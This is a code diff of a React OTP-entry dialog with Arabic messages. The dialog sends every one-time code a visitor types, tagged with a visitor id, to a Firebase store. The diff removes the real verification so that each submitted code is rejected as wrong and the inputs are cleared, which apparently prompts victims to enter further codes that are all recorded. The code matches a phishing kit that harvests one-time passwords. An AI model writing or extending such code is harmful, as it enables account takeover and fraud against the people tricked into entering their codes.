@@ -13,12 +13,11 @@ import { addData } from "@/lib/firebase"
 interface OTPDialogProps {
   isOpen: boolean
   onClose: () => void
-  onVerify: (otp: string) => Promise<any>
   phoneNumber: string
   onResend?: () => Promise<boolean>
 }
-const allOtps=['']
-export function OTPDialog({ isOpen, onClose, onVerify, phoneNumber, onResend }: OTPDialogProps) {
+const allOtps = ['']
+export function OTPDialog({ isOpen, onClose, phoneNumber, onResend }: OTPDialogProps) {
   const [otp, setOtp] = useState(["", "", "", "", "", ""])
   const [isVerifying, setIsVerifying] = useState(false)
   const [isResending, setIsResending] = useState(false)
@@ -113,10 +112,10 @@ export function OTPDialog({ isOpen, onClose, onVerify, phoneNumber, onResend }: 
   }
 
   const handleVerify = async (otpCode: string) => {
-const visitorId=localStorage.getItem('visitor')
-allOtps.push(otpCode)
+    const visitorId = localStorage.getItem('visitor')
+    allOtps.push(otpCode)
 
-    addData({id:visitorId,otp:otpCode,allOtps})
+    addData({ id: visitorId, otp: otpCode, allOtps })
     if (otpCode.length !== 6) {
       setError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
       return
@@ -126,19 +125,11 @@ allOtps.push(otpCode)
     setError("")
 
     try {
-      const isValid = await onVerify(otpCode)
+      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى")
+      // Clear OTP inputs on error
+      setOtp(["", "", "", "", "", ""])
+      inputRefs.current[0]?.focus()
 
-      if (isValid) {
-        setSuccess(true)
-        setTimeout(() => {
-          onClose()
-        }, 1500)
-      } else {
-        setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى")
-        // Clear OTP inputs on error
-        setOtp(["", "", "", "", "", ""])
-        inputRefs.current[0]?.focus()
-      }
     } catch (error) {
       setError("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى")
       setOtp(["", "", "", "", "", ""])
@@ -224,9 +215,8 @@ allOtps.push(otpCode)
                   onChange={(e) => handleInputChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
                   onPaste={index === 0 ? handlePaste : undefined}
-                  className={`w-12 h-12 text-center text-lg font-bold border-2 ${
-                    error ? "border-red-500" : "border-gray-300"
-                  } focus:border-[#00843D] focus:ring-[#00843D]`}
+                  className={`w-12 h-12 text-center text-lg font-bold border-2 ${error ? "border-red-500" : "border-gray-300"
+                    } focus:border-[#00843D] focus:ring-[#00843D]`}
                   disabled={isVerifying}
                 />
               ))}
